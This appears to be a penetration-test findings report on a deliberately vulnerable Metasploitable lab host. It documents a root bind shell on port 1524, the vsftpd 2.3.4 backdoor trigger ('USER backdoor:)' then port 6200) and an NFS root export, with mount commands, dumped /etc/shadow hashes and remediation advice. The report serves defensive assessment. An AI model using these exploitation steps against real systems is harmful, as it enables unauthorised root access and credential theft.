Root Shell via Ingreslock Bind Shell (Port 1524)

CRITICAL
10.0
FINDING-001
excellent

Description: A root-level bind shell is listening on TCP port 1524 (ingreslock). Any attacker can connect directly and obtain an interactive root shell with no authentication required. This provides complete system compromise with uid=0(root) access.

Affected Hosts:

192.168.0.140

Evidence

Connection to bind shell on port 1524 returned immediate root access:\n\nroot@metasploitable:/# uid=0(root) gid=0(root) groups=0(root)\nroot\nmetasploitable\nLinux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/bin/sh\nbin:x:2:2:bin:/bin:/bin/sh\n\n/etc/shadow extracted:\nroot:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::\nsys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:14742:0:99999:7:::

Remediation

Remove the bind shell from port 1524. Investigate how it was installed and check for additional backdoors. Rebuild the system from a known-good image.

vsftpd 2.3.4 Backdoor Command Execution (CVE-2011-2523)

CRITICAL
10.0
FINDING-002
acceptable

Description: The vsftpd 2.3.4 FTP server contains a backdoor that opens a root shell on TCP port 6200 when a username containing ':)' is sent during authentication. This was a supply-chain compromise of the vsftpd source code. Exploitation provides immediate uid=0(root) access.

Affected Hosts:

192.168.0.140

Evidence

Triggered backdoor by sending 'USER backdoor:)' to FTP port 21, then connected to port 6200:\n\n220 (vsFTPd 2.3.4)\n331 Please specify the password.\n\nBackdoor shell on port 6200:\nuid=0(root) gid=0(root)\nroot\nmetasploitable\nLinux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux

Remediation

Upgrade vsftpd to a version later than 2.3.4 obtained from a trusted source. Verify package integrity with checksums.

NFS Root Filesystem Export to All Hosts

CRITICAL
9.8
FINDING-003
acceptable

Description: The NFS server exports the entire root filesystem (/) to all hosts (*) with no access restrictions. Any host on the network can mount the entire filesystem and read sensitive files including /etc/passwd. Combined with the root shell, /etc/shadow with password hashes was also extracted.

Affected Hosts:

192.168.0.140

Evidence

showmount -e 192.168.0.140:\nExport list for 192.168.0.140:\n/ *\n\nAfter mounting:\nmount -t nfs 192.168.0.140:/ /tmp/nfs_mount -o nolock\n\n/etc/passwd readable:\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/bin/sh\nbin:x:2:2:bin:/bin:/bin/sh\n\n/etc/shadow (obtained via root bind shell):\nroot:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::

Remediation

Restrict NFS exports to specific hosts and subnets. Never export the root filesystem. Use NFSv4 with Kerberos authentication.
